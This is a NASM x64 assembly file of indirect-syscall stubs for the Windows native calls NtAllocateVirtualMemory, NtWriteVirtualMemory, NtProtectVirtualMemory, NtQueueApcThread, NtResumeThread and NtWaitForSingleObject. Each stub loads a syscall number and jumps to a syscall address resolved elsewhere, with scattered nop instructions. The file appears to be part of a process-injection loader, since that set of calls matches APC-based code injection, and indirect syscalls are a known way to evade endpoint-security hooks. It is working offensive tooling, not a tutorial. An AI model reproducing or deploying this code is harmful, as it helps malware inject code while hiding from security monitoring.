; nasm -f win64 ./libs/indirect_calls.asm -o .o
default rel
extern g_SSN_NtAllocateVirtualMemory
extern g_SYSADDR_NtAllocateVirtualMemory
extern g_SSN_NtWriteVirtualMemory
extern g_SYSADDR_NtWriteVirtualMemory
extern g_SSN_NtProtectVirtualMemory
extern g_SYSADDR_NtProtectVirtualMemory
extern g_SSN_NtResumeThread
extern g_SYSADDR_NtResumeThread
extern g_SSN_NtWaitForSingleObject
extern g_SYSADDR_NtWaitForSingleObject
extern g_SSN_NtQueueApcThread
extern g_SYSADDR_NtQueueApcThread
global stubNtAllocateVirtualMemory
global stubNtWriteVirtualMemory
global stubNtProtectVirtualMemory
global stubNtResumeThread
global stubNtWaitForSingleObject
global stubNtQueueApcThread
section .text
stubNtAllocateVirtualMemory:
	xor	eax, eax
	mov	r10, rcx
	nop
	mov	eax, [g_SSN_NtAllocateVirtualMemory]
	nop
	nop
	jmp	[g_SYSADDR_NtAllocateVirtualMemory]
stubNtWriteVirtualMemory:
	xor	eax, eax
	mov	r10, rcx
	nop
	mov	eax, [g_SSN_NtWriteVirtualMemory]
	jmp	[g_SYSADDR_NtWriteVirtualMemory]
stubNtProtectVirtualMemory:
	xor	eax, eax
	mov	r10, rcx
	nop
	mov	eax, [g_SSN_NtProtectVirtualMemory]
	nop
	jmp	[g_SYSADDR_NtProtectVirtualMemory]
stubNtResumeThread:
	xor	eax, eax
	mov	r10, rcx
	mov	eax, [g_SSN_NtResumeThread]
	nop
	nop
	jmp	[g_SYSADDR_NtResumeThread]
stubNtWaitForSingleObject:
	xor	eax, eax
	mov	r10, rcx
	nop
	nop
	mov	eax, [g_SSN_NtWaitForSingleObject]
	nop
	jmp	[g_SYSADDR_NtWaitForSingleObject]
stubNtQueueApcThread:
	xor	eax, eax
	mov	r10, rcx
	mov	eax, [g_SSN_NtQueueApcThread]
	nop
	nop
	jmp	[g_SYSADDR_NtQueueApcThread]
